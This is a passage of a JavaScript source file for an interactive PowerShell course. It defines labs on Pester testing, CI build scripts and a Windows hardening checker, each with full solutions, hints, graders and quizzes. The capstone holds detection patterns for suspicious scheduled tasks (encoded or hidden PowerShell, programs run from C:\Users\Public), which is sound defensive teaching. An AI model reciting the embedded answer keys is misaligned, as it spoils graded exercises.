        hints: ["Invoke-ScriptAnalyzer -Path .\\scripts\\Sync-Users.ps1 | Select-Object -ExpandProperty RuleName -Unique | Sort-Object"],
        check: function (r) {
          var want = lib.analyze(ctxOf(r), SYNC_USERS, "Sync-Users.ps1").map(function (d) { return str(d.get("RuleName")); }).filter(function (x, i, a) { return a.indexOf(x) === i; }).sort();
          var got = asList(r.v("rules")).map(str);
          if (!same(got, want)) return "$rules should be " + H.show(want) + ". Yours: " + H.show(got) + ".";
          var other = lines("function Get-Thing { Write-Host 'x' }", "iex 'Get-Date'");
          var r2 = r.run(r.src, { files: { "scripts/Sync-Users.ps1": other } });
          return same(asList(r2.v("rules")).map(str), ["PSAvoidUsingCmdletAliases", "PSAvoidUsingInvokeExpression", "PSAvoidUsingWriteHost"]) ? true : "With a different Sync-Users.ps1, $rules didn't follow. Run Invoke-ScriptAnalyzer instead of typing the names.";
        }
      }
    ],
    solution: ps`
      Describe "Test-PasswordPolicy" {
          BeforeAll { . .\src\PasswordPolicy.ps1 }

          It "accepts a strong password" {
              Test-PasswordPolicy -Candidate 'Correct-Horse-42' -UserName 'ana' | Should -BeNullOrEmpty
          }
          It "rejects 11 characters but accepts 12" {
              Test-PasswordPolicy -Candidate 'Abcdefghij1' | Should -Contain 'TooShort'
              Test-PasswordPolicy -Candidate 'Abcdefghijk1' | Should -BeNullOrEmpty
          }
          It "needs a digit" {
              Test-PasswordPolicy -Candidate 'NoDigitsHereAtAll' | Should -Contain 'NoDigit'
          }
          It "needs a capital letter" {
              Test-PasswordPolicy -Candidate 'lowercase-only-42' | Should -Contain 'NoUpper'
          }
          It "rejects the user name inside the password" {
              Test-PasswordPolicy -Candidate 'Super-ana.silva-2026' -UserName 'ana.silva' | Should -Contain 'ContainsUserName'
          }
      }

      $rules = Invoke-ScriptAnalyzer -Path .\scripts\Sync-Users.ps1 |
          Select-Object -ExpandProperty RuleName -Unique | Sort-Object
    `,
    debrief: "<p>Ticket closed. Your tests don't just pass: they <b>fail when the code is wrong</b>, which is the whole point (this check technique is called mutation testing). And the analyzer turned a vague \"this script looks old\" into a concrete list: a plain-text password, an empty catch, a missing -WhatIf and some style issues.</p>",
    realworld: "On your PC: Install-Module Pester, PSScriptAnalyzer -Scope CurrentUser -Force -SkipPublisherCheck. Save tests as Name.Tests.ps1 and run Invoke-Pester -Output Detailed. VS Code's PowerShell extension shows PSScriptAnalyzer warnings as you type.",
    quiz: [
      { q: "The rule is \"at least 12 characters\". Which test catches an off-by-one bug best?", options: ["A 5-character password", "A 30-character password", "Passwords of 11 and 12 characters", "An empty password"], answer: 2, why: "Bugs live at the edges." },
      { q: "What does <code>Mock Get-Service { ... }</code> do in a test?", options: ["Deletes services", "Replaces Get-Service with your fake during the test", "Runs Get-Service twice", "Checks Get-Service exists"], answer: 1, why: "Tests stay fast and don't depend on the real machine." },
      { q: "PSScriptAnalyzer…", options: ["Runs your script in a sandbox", "Reads the code without running it and flags problems", "Fixes bugs automatically", "Signs scripts"], answer: 1, why: "It's static analysis: a linter." }
    ]
  });

  /* ================================================================== PS-135 PowerShell in CI */
  var GOOD_TESTS = lines(
    "Describe 'Test-PasswordPolicy' {",
    "    BeforeAll { . $PSScriptRoot\\..\\src\\PasswordPolicy.ps1 }",
    "    It 'accepts a strong password' { Test-PasswordPolicy -Candidate 'Correct-Horse-42' | Should -BeNullOrEmpty }",
    "    It 'rejects 11 characters' { Test-PasswordPolicy -Candidate 'Abcdefghij1' | Should -Contain 'TooShort' }",
    "    It 'needs a digit' { Test-PasswordPolicy -Candidate 'NoDigitsHereAtAll' | Should -Contain 'NoDigit' }",
    "    It 'needs a capital' { Test-PasswordPolicy -Candidate 'lowercase-only-42' | Should -Contain 'NoUpper' }",
    "}");
  var REPORT_SRC = lines("function Get-Report {", "    Write-Host 'Building report'", "}");
  var CI_FILES = { "src/PasswordPolicy.ps1": POLICY_FN, "src/Get-Report.ps1": REPORT_SRC, "tests/PasswordPolicy.Tests.ps1": GOOD_TESTS };
  var CI_PRELUDE = "Initialize-LabScenario ci";
  function annotations(r) { return r.lines.filter(function (l) { return /^::(error|warning|notice)/.test(l); }); }
  function expectedAnnotations(r, files) {
    var out = [];
    Object.keys(files).filter(function (k) { return /^src\//.test(k); }).sort(function (a, b) { return a.toLowerCase() < b.toLowerCase() ? -1 : 1; }).forEach(function (k) {
      lib.analyze(ctxOf(r), files[k], k.split("/").pop()).forEach(function (d) {
        out.push("::" + (d.get("Severity") === "Error" ? "error" : "warning") + " file=" + k + ",line=" + d.get("Line") + "::" + d.get("Message"));
      });
    });
    return out;
  }
  LABS.push({
    id: "ps-135", n: 35, module: 4, ticket: "PS-135", xp: 100,
    title: "PowerShell in the pipeline",
    topic: "CI: exit codes, annotations, pwsh in GitHub Actions",
    from: MAYA,
    story: "<p>Tests and the linter only help if they run on <b>every push</b>, not when someone remembers. Write <code>build.ps1</code>, the script our GitHub Actions workflow will run: lint, test, report, and fail the build when it should.</p><p>The editor is <code>build.ps1</code>; the repository is in the lab folder (<code>src</code>, <code>tests</code>).</p>",
    learn:
      "<h3>How CI runs PowerShell</h3><p>A GitHub Actions workflow is a YAML file in <code>.github/workflows/</code>. A step with <code>shell: pwsh</code> runs PowerShell 7 on Windows, Linux or macOS runners:</p>" +
      '<pre class="code">name: ci\non: [push, pull_request]\njobs:\n  build:\n    runs-on: windows-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Install tools\n        shell: pwsh\n        run: Install-Module Pester, PSScriptAnalyzer -Force -Scope CurrentUser\n      - name: Lint and test\n        shell: pwsh\n        run: ./build.ps1\n        env:\n          KESTREL_API_TOKEN: $\{{ secrets.KESTREL_API_TOKEN }}</pre>' +
      "<h3>The contract: exit codes</h3><p>A step <b>fails</b> when its script exits with a non-zero code. So a build script must end with <code>exit 1</code> when something's wrong, and should stop on unexpected errors: put <code>$ErrorActionPreference = 'Stop'</code> at the top.</p>" +
      "<h3>Talking to GitHub</h3><ul><li><b>Annotations</b>: print <code>::error file=src/x.ps1,line=3::message</code> (or <code>::warning</code>) and GitHub shows it on that line of the pull request.</li>" +
      "<li><b>Step summary</b>: markdown appended to the file named in <code>$env:GITHUB_STEP_SUMMARY</code> appears on the run's page.</li>" +
      "<li><b>Secrets</b> arrive as environment variables (the <code>env:</code> block above); GitHub masks them in logs.</li></ul>" +
      ex("$env:GITHUB_ACTIONS\n$env:GITHUB_STEP_SUMMARY\nInvoke-ScriptAnalyzer -Path .\\src -Recurse | Select-Object Severity, ScriptName, Line, RuleName") +
      '<pre class="code">$result = Invoke-Pester -Path .\\tests -PassThru -Output None\n$result.PassedCount; $result.FailedCount</pre>',
    files: CI_FILES,
    prelude: CI_PRELUDE,
    starter: ps`
      # PS-135 · build.ps1 (runs in CI)
      $ErrorActionPreference = 'Stop'

      # 1) Lint everything under src. For each finding print a GitHub annotation:
      #    ::warning file=src/<ScriptName>,line=<Line>::<Message>     (::error for Error severity)


      # 2) Run the tests in .\tests, quietly, keeping the results in $tests


      # 3) Append this table to the file in $env:GITHUB_STEP_SUMMARY (with the real numbers):
      #    | Check | Result |
      #    | --- | --- |
      #    | Lint errors | 0 |
      #    | Lint warnings | 1 |
      #    | Tests passed | 4 |
      #    | Tests failed | 0 |


      # 4) Fail the build (exit code 1) when there's any lint error or failed test
    `,
    objectives: [
      {
        id: "annotate", text: "One annotation per finding: <code>::warning file=src/Get-Report.ps1,line=2::...</code>",
        hints: ["foreach ($f in $findings) { $level = if ($f.Severity -eq 'Error') { 'error' } else { 'warning' }; \"::$level file=src/$($f.ScriptName),line=$($f.Line)::$($f.Message)\" }"],
        check: function (r) {
          var want = expectedAnnotations(r, CI_FILES), got = annotations(r);
          if (!same(got, want)) return "Expected these annotations:\n" + want.join("\n") + "\nGot:\n" + (got.join("\n") || "(none)");
          var files2 = Object.assign({}, CI_FILES, { "src/Bad.ps1": lines("$s = ConvertTo-SecureString 'x' -AsPlainText -Force") });
          var r2 = r.run(r.src, { files: { "src/Bad.ps1": files2["src/Bad.ps1"] } });
          return same(annotations(r2), expectedAnnotations(r2, files2)) ? true : "When I added src\\Bad.ps1 (an Error-level finding), the annotations didn't match:\n" + annotations(r2).join("\n");
        }
      },
      {
        id: "tests", text: "<code>$tests</code> holds the Pester results (4 passed, 0 failed) from <code>.\\tests</code>.",
        hints: ["$tests = Invoke-Pester -Path .\\tests -PassThru -Output None"],
        check: function (r) {
          var t = r.v("tests");
          if (!t || !t.get || t.get("PassedCount") === undefined) return "$tests should be the object from Invoke-Pester -PassThru.";
          return t.get("PassedCount") === 4 && t.get("FailedCount") === 0 ? true : "$tests should show 4 passed and 0 failed.";
        }
      },
      {
        id: "summary", text: "The step summary file gets the results table with the real numbers.",
        hints: ["$summary = '| Check | Result |', '| --- | --- |', \"| Lint errors | $errors |\", ...; Add-Content -Path $env:GITHUB_STEP_SUMMARY -Value $summary"],
        check: function (r) {
          var f = r.file("step-summary.md");
          if (f === null) return "Nothing was written to $env:GITHUB_STEP_SUMMARY.";
          var need = ["| Check | Result |", "| --- | --- |", "| Lint errors | 0 |", "| Lint warnings | 1 |", "| Tests passed | 4 |", "| Tests failed | 0 |"];
          var ls = f.replace(/\r/g, "").split("\n").map(function (l) { return l.trim(); });
          var miss = need.filter(function (n) { return ls.indexOf(n) < 0; });
          if (miss.length) return "The summary is missing: " + miss.join(" / ");
          var r2 = r.run(r.src, { files: { "tests/Broken.Tests.ps1": lines("Describe 'x' { It 'breaks' { 1 | Should -Be 2 } }") } });
          var f2 = (r2.file("step-summary.md") || "").replace(/\r/g, "");
          return /\| Tests failed \| 1 \|/.test(f2) ? true : "With one failing test, the summary should say | Tests failed | 1 |.";
        }
      },
      {
        id: "exit", text: "The script exits with 0 on this repository, and 1 when a test fails or the linter finds an error.",
        hints: ["if ($errors -gt 0 -or $tests.FailedCount -gt 0) { exit 1 }"],
        check: function (r) {
          if (r.exit !== 0) return "On this repository (no lint errors, all tests pass) the build should succeed (exit code 0). It exited " + r.exit + (r.error ? ": " + r.error.message : "") + ".";
          var r2 = r.run(r.src, { files: { "tests/Broken.Tests.ps1": lines("Describe 'x' { It 'breaks' { 1 | Should -Be 2 } }") } });
          if (r2.exit !== 1) return "With a failing test, the build should exit 1. It exited " + r2.exit + ".";
          var r3 = r.run(r.src, { files: { "src/Bad.ps1": lines("$s = ConvertTo-SecureString 'x' -AsPlainText -Force") } });
          return r3.exit === 1 ? true : "With an Error-level lint finding, the build should exit 1. It exited " + r3.exit + ".";
        }
      }
    ],
    solution: ps`
      $ErrorActionPreference = 'Stop'

      $findings = Invoke-ScriptAnalyzer -Path .\src -Recurse
      foreach ($f in $findings) {
          $level = if ($f.Severity -eq 'Error') { 'error' } else { 'warning' }
          "::$level file=src/$($f.ScriptName),line=$($f.Line)::$($f.Message)"
      }
      $errors = @($findings | Where-Object Severity -eq 'Error').Count
      $warnings = @($findings | Where-Object Severity -eq 'Warning').Count

      $tests = Invoke-Pester -Path .\tests -PassThru -Output None

      $summary = '| Check | Result |', '| --- | --- |',
          "| Lint errors | $errors |", "| Lint warnings | $warnings |",
          "| Tests passed | $($tests.PassedCount) |", "| Tests failed | $($tests.FailedCount) |"
      Add-Content -Path $env:GITHUB_STEP_SUMMARY -Value $summary

      if ($errors -gt 0 -or $tests.FailedCount -gt 0) { exit 1 }
    `,
    debrief: "<p>Ticket closed. Every push now gets linted and tested, problems show up as comments on the exact line, the run page has a summary table, and a red build blocks the merge. This is the \"Sec\" in DevSecOps in practice: security checks that run automatically, every time.</p>",
    realworld: "In a GitHub repo of your own, add .github/workflows/ci.yml with the YAML from the Learn tab and a build.ps1. Push, then open the Actions tab. Annotations appear in the run and on pull request diffs.",
    quiz: [
      { q: "How does a CI step know your script failed?", options: ["It reads the output", "A non-zero exit code", "Red text", "It can't"], answer: 1, why: "exit 1 fails the step; exit 0 passes it." },
      { q: "What does <code>::error file=src/a.ps1,line=3::Bad</code> do in GitHub Actions?", options: ["Nothing", "Shows an error annotation on that line", "Deletes the line", "Fails silently"], answer: 1, why: "It's a workflow command parsed from the output." },
      { q: "Why <code>$ErrorActionPreference = 'Stop'</code> in a build script?", options: ["Speed", "So unexpected errors stop the build instead of being ignored", "To hide errors", "It's required by YAML"], answer: 1, why: "A half-working build that reports success is worse than a failed one." }
    ]
  });

  /* ================================================================== PS-136 capstone: hardening checker */
  var CHECKS = ["Execution policy", "RDP requires NLA", "Script block logging", "PowerShell 2.0 removed", "Guest disabled", "Local admins approved", "Service folders locked down", "No suspicious scheduled tasks"];
  function hardened(sys) {
    sys.groups.Administrators = ["Administrator", "dana.park", "svc-backup"];
    sys.features.MicrosoftWindowsPowerShellV2Root = "Disabled"; sys.features.MicrosoftWindowsPowerShellV2 = "Disabled";
    sys.registry.push(lib.reg.key("HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging", { EnableScriptBlockLogging: 1 }));
  }
  function resultRows(v) { return asList(v).map(function (o) { return o && o.get ? str(o.get("Check")) + "=" + str(o.get("Status")) : "?"; }); }
  LABS.push({
    id: "ps-136", n: 36, module: 4, ticket: "PS-136", xp: 200, capstone: true,
    title: "The hardening checker",
    topic: "Module 4 capstone project",
    from: "Dana Park & Dev Patel",
    story: "<p>KC-WIN-01 got hit because small weaknesses added up. Write <code>Invoke-KcHardeningCheck</code>: eight checks, each <b>Pass</b> or <b>Fail</b> with details, a JSON report, and an exit code so it can run as a scheduled task or a CI gate on every Windows server.</p><p>Everything in Module 4 (and some of Module 2) in one tool. Elevated session.</p>",
    learn:
      '<div class="callout warn"><b>Capstone rules.</b> There are no hints. Build one check at a time and test it in the console. ' +
      "If you get completely stuck, the Tasks tab has a button to reveal the full solution. The capstone then earns half XP.</div>" +
      "<h3>The checks (in this order)</h3>" +
      '<table class="t"><tr><th>Check</th><th>Pass when</th></tr>' +
      "<tr><td><code>Execution policy</code></td><td>the LocalMachine policy is RemoteSigned, AllSigned or Restricted</td></tr>" +
      "<tr><td><code>RDP requires NLA</code></td><td><code>UserAuthentication</code> is 1 under <code>HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp</code></td></tr>" +
      "<tr><td><code>Script block logging</code></td><td><code>EnableScriptBlockLogging</code> is 1 under <code>" + SBL + "</code></td></tr>" +
      "<tr><td><code>PowerShell 2.0 removed</code></td><td>the <code>MicrosoftWindowsPowerShellV2Root</code> feature is Disabled</td></tr>" +
      "<tr><td><code>Guest disabled</code></td><td>the Guest account is disabled</td></tr>" +
      "<tr><td><code>Local admins approved</code></td><td>every Administrators member is in <code>config\\approved-admins.txt</code></td></tr>" +
      "<tr><td><code>Service folders locked down</code></td><td>no service's program folder gives Everyone, BUILTIN\\Users or Authenticated Users Write/Modify/FullControl</td></tr>" +
      "<tr><td><code>No suspicious scheduled tasks</code></td><td>no task runs PowerShell with an encoded command or a hidden window, or anything from C:\\Users\\Public</td></tr></table>" +
      "<h3>Output</h3><ul><li>One object per check, in that order: <code>Check</code>, <code>Status</code> (<code>Pass</code>/<code>Fail</code>), <code>Detail</code>. For a failure, <code>Detail</code> names the offenders (accounts, folders, task names).</li>" +
      "<li>Save all results as JSON to <code>reports\\hardening.json</code>.</li><li>Print <code>6 of 8 checks failed</code> (the real numbers).</li><li>Exit with <code>1</code> if anything failed.</li></ul>" +
      "<h3>Tips</h3><ul><li>Service program paths come from <code>Get-CimInstance Win32_Service</code>'s <code>PathName</code>: quoted (<code>\"C:\\...\\x.exe\" --arg</code>) or not (<code>C:\\...\\x.exe --arg</code>). Take everything up to <code>.exe</code>, then <code>Split-Path</code>. Skip paths that don't exist.</li>" +
      "<li>Scheduled task actions: <code>(Get-ScheduledTask).Actions</code> has <code>Execute</code> and <code>Arguments</code>.</li></ul>",
    files: { "config/approved-admins.txt": lines("Administrator", "dana.park", "svc-backup") },
    prelude: "Initialize-LabScenario incident, permissions, admin",
    starter: ps`
      # PS-136 · The hardening checker (Module 4 capstone)

      function Invoke-KcHardeningCheck {

      }

      $results = Invoke-KcHardeningCheck
      $results | Format-Table Check, Status, Detail
    `,
    solution: ps`
      function New-Result {
          param([string]$Check, [bool]$Pass, [string]$Detail = '')
          [PSCustomObject]@{ Check = $Check; Status = if ($Pass) { 'Pass' } else { 'Fail' }; Detail = $Detail }
      }

      function Invoke-KcHardeningCheck {
          $risky = 'Everyone', 'BUILTIN\Users', 'NT AUTHORITY\Authenticated Users'

          $policy = Get-ExecutionPolicy -Scope LocalMachine
          New-Result 'Execution policy' ($policy -in 'RemoteSigned', 'AllSigned', 'Restricted') "LocalMachine is $policy"

          $rdp = Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp'
          New-Result 'RDP requires NLA' ($rdp.UserAuthentication -eq 1) "UserAuthentication = $($rdp.UserAuthentication)"

          $sbl = Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -ErrorAction SilentlyContinue
          New-Result 'Script block logging' ($sbl.EnableScriptBlockLogging -eq 1) 'EnableScriptBlockLogging is not 1'

          $v2 = (Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root).State
          New-Result 'PowerShell 2.0 removed' ($v2 -eq 'Disabled') "MicrosoftWindowsPowerShellV2Root is $v2"

          $guest = Get-LocalUser -Name Guest
          New-Result 'Guest disabled' (-not $guest.Enabled) "Guest enabled: $($guest.Enabled)"

          $approved = Get-Content .\config\approved-admins.txt
          $extra = (Get-LocalGroupMember -Group Administrators).Name | ForEach-Object { $_.Split('\')[-1] } | Where-Object { $_ -notin $approved }
          New-Result 'Local admins approved' (-not $extra) ($extra -join ', ')

          $folders = foreach ($svc in Get-CimInstance Win32_Service) {
              if ($svc.PathName -match '^"?([^"]+?\.exe)') { Split-Path $Matches[1] }
          }
          $writable = foreach ($folder in $folders | Sort-Object -Unique) {
              if (-not (Test-Path $folder)) { continue }
              $bad = (Get-Acl $folder).Access | Where-Object {
                  $_.IdentityReference -in $risky -and $_.AccessControlType -eq 'Allow' -and $_.FileSystemRights -match 'Write|Modify|FullControl'
              }
              if ($bad) { $folder }
          }
          New-Result 'Service folders locked down' (-not $writable) ($writable -join ', ')

          $tasks = foreach ($task in Get-ScheduledTask) {
              foreach ($a in $task.Actions) {
                  $line = "$($a.Execute) $($a.Arguments)"
                  if (($a.Execute -match 'powershell|pwsh' -and $a.Arguments -match '\s?-e(nc\w*|c)?\s|-w\w*\s+h') -or $line -match 'Users\\Public') { $task.TaskName }
              }
          }
          New-Result 'No suspicious scheduled tasks' (-not $tasks) (($tasks | Sort-Object -Unique) -join ', ')
      }

      $results = Invoke-KcHardeningCheck
      $results | Format-Table Check, Status, Detail
      $results | ConvertTo-Json | Set-Content .\reports\hardening.json
      $failed = @($results | Where-Object Status -eq 'Fail').Count
      "$failed of $($results.Count) checks failed"
      if ($failed) { exit 1 }
    `,
    objectives: [
      {
        id: "shape", hints: [],
        text: "<code>Invoke-KcHardeningCheck</code> returns the 8 checks in order, each with <code>Check</code>, <code>Status</code> and <code>Detail</code>.",
        check: function (r) {
          if (!r.fn("Invoke-KcHardeningCheck")) return "I can't find a function called Invoke-KcHardeningCheck.";
          var rows = asList(r.v("results"));
          if (rows.length !== 8 || !rows[0].get) return "$results (from Invoke-KcHardeningCheck) should hold 8 objects. It holds " + rows.length + ".";
          var names = rows.map(function (o) { return str(o.get("Check")); });
          if (!same(names, CHECKS)) return "The checks should be, in order: " + CHECKS.join(", ") + ". Yours: " + names.join(", ");
          return rows.every(function (o) { return /^(Pass|Fail)$/.test(str(o.get("Status"))) && o.has("Detail"); }) ? true : "Each result needs Status (Pass or Fail) and Detail.";
        }
      },
      {
        id: "verdicts", hints: [],
        text: "On KC-WIN-01 the verdicts are right: Execution policy and Guest pass; the other six fail, with details naming the offenders.",
        check: function (r) {
          var rows = asList(r.v("results"));
          if (rows.length !== 8) return "Do the first task first.";
          var want = CHECKS.map(function (c, i) { return c + "=" + (i === 0 || i === 4 ? "Pass" : "Fail"); });
          var got = resultRows(rows);
          for (var i = 0; i < 8; i++) if (got[i] !== want[i]) return "Check \"" + CHECKS[i] + "\" should be " + want[i].split("=")[1] + " on this machine, but yours says " + got[i].split("=")[1] + ".";
          var d = function (i) { return str(rows[i].get("Detail")); };
          if (!/gus\.hall/.test(d(5)) || !/temp\.admin/.test(d(5)) || !/support_tmp/.test(d(5))) return "The Local admins Detail should name gus.hall, temp.admin and support_tmp. It says: " + H.show(d(5));
          if (!/Updater/i.test(d(6))) return "The Service folders Detail should name the Kestrel Updater folder. It says: " + H.show(d(6));
          if (!/WindowsUpdateCheck/.test(d(7)) || /Defrag|ScheduledDefrag|Kestrel agent/i.test(d(7))) return "The scheduled tasks Detail should name WindowsUpdateCheck (and only suspicious tasks). It says: " + H.show(d(7));
          var r2 = r.run(r.src, { system: function (sys) { sys.tasks.push({ TaskPath: "\\", TaskName: "PublicHelper", State: "Ready", Actions: [{ Execute: "C:\\Users\\Public\\helper.exe", Arguments: null, WorkingDirectory: null }], Triggers: [{ kind: "AtLogOn" }], Principal: { UserId: "dev", RunLevel: "Limited", LogonType: "Interactive" }, Author: "KC-WIN-01\\dev", Description: "", LastRunTime: null, LastTaskResult: 0 }); } });
          var row = asList(r2.v("results"))[7];
          return row && /PublicHelper/.test(str(row.get("Detail"))) ? true : "A task that runs C:\\Users\\Public\\helper.exe should be flagged too (anything run from C:\\Users\\Public is suspicious).";
        }
      },
      {
        id: "clean", hints: [],
        text: "On a properly hardened server every check passes (no false alarms).",
        check: function (r) {
          var r2 = r.run(r.src, { prelude: "Initialize-LabScenario admin", system: hardened });
          var got = resultRows(r2.v("results"));
          var bad = got.filter(function (x) { return !/=Pass$/.test(x); });
          return got.length === 8 && !bad.length ? true : "On a hardened server, these checks still fail: " + (bad.join(", ") || "(no results)") + (r2.error ? " (error: " + r2.error.message + ")" : "");
        }
      },
      {
        id: "report", hints: [],
        text: "<code>reports\\hardening.json</code> holds all 8 results, and the script prints <code>6 of 8 checks failed</code>.",
        check: function (r) {
          var f = r.file("reports\\hardening.json");
          if (f === null) return "Save the results to reports\\hardening.json (ConvertTo-Json).";
          var data;
          try { data = JSON.parse(f); } catch (e) { return "reports\\hardening.json isn't valid JSON."; }
          if (!Array.isArray(data) || data.length !== 8 || !data[0].Check || !data[0].Status) return "The JSON should be an array of the 8 results (Check, Status, Detail).";
          return r.lines.indexOf("6 of 8 checks failed") >= 0 ? true : "Print the summary line \"6 of 8 checks failed\".";
        }
      },
      {
        id: "exit", hints: [],
        text: "The script exits with 1 when any check fails, and 0 on a hardened server.",
        check: function (r) {
          if (r.exit !== 1) return "With failures, the script should exit 1. It exited " + r.exit + ".";
          var r2 = r.run(r.src, { prelude: "Initialize-LabScenario admin", system: hardened });
          return r2.exit === 0 ? true : "On a hardened server, the script should exit 0. It exited " + r2.exit + ".";
        }
      }
    ],
    debrief: "<p><b>Module 4 complete, and the PowerShell track with it.</b> Your checker turns last night's incident into eight questions any server can answer in a second, with a report for humans and an exit code for machines. Schedule it, put it in CI, and the next weakness gets found by you, not by an attacker.</p>" +
      "<p>From \"what's a cmdlet?\" to a security tool with tests, signatures and a pipeline. Next track: Linux.</p>",
    realworld: "Real-world versions of this are compliance baselines: Microsoft Security Compliance Toolkit, CIS Benchmarks and tools like HardeningKitty or PowerSTIG. Read a few of their checks: you can now understand (and write) most of them.",
    quiz: []
  });

  LABS.forEach(function (l) { l.drills = []; T.LABS.push(l); });
  T.UPCOMING = T.UPCOMING.filter(function (row) { return row.module !== 4; });
  T.M4 = { sha: sha, asList: asList, str: str, sorted: sorted, ctxOf: ctxOf, DISK_REPORT: DISK_REPORT, POLICY_FN: POLICY_FN };
})();
